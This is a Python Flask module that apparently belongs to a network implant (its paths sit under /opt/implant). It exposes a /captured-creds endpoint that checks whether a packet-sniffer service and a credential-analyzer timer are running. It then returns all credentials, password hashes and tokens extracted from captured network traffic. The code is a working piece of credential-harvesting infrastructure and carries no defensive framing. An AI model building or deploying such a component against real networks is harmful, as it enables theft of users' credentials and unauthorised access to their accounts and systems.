"""
Credential findings endpoint: returns all captured credentials,
hashes, and tokens from PCAP analysis.

Findings are written by cred-analyzer.py (runs every 60 s via systemd
timer).  This endpoint simply reads the latest findings file; it does
NOT invoke the analyzer synchronously, because scapy + PCAP processing
can exceed gunicorn's worker timeout and crash the API.
"""

import json
import os
import subprocess

from flask import jsonify

FINDINGS_FILE = "/opt/implant/logs/cred-analyzer/findings.json"
STATE_FILE = "/opt/implant/logs/cred-analyzer/state.json"


def register(app):

    @app.route("/captured-creds", methods=["GET"])
    def captured_creds():
        """Return sniffer state, analyzer state, and all extracted credentials."""
        # Sniffer status
        try:
            r = subprocess.run(
                ["systemctl", "is-active", "packet-sniffer"],
                capture_output=True, text=True, timeout=5,
            )
            sniffer_active = r.stdout.strip() == "active"
        except Exception:
            sniffer_active = False

        # Analyzer timer status
        try:
            r = subprocess.run(
                ["systemctl", "is-active", "cred-analyzer.timer"],
                capture_output=True, text=True, timeout=5,
            )
            analyzer_active = r.stdout.strip() == "active"
        except Exception:
            analyzer_active = False

        # Findings
        findings = []
        if os.path.isfile(FINDINGS_FILE):
            try:
                with open(FINDINGS_FILE) as f:
                    data = json.load(f)
                # Support both old (flat list) and new (wrapped) format
                if isinstance(data, dict):
                    findings = data.get("findings", [])
                else:
                    findings = data
            except (json.JSONDecodeError, OSError):
                pass

        # Type breakdown
        types = {}
        for f in findings:
            t = f.get("type", "unknown")
            types[t] = types.get(t, 0) + 1

        # Analyzer state
        files_tracked = 0
        if os.path.isfile(STATE_FILE):
            try:
                with open(STATE_FILE) as fh:
                    state = json.load(fh)
                files_tracked = len(state.get("files", {}))
            except (json.JSONDecodeError, OSError):
                pass

        return jsonify({
            "sniffer": "active" if sniffer_active else "inactive",
            "analyzer": "active" if analyzer_active else "inactive",
            "pcap_files_tracked": files_tracked,
            "count": len(findings),
            "types": types,
            "findings": findings,
        })
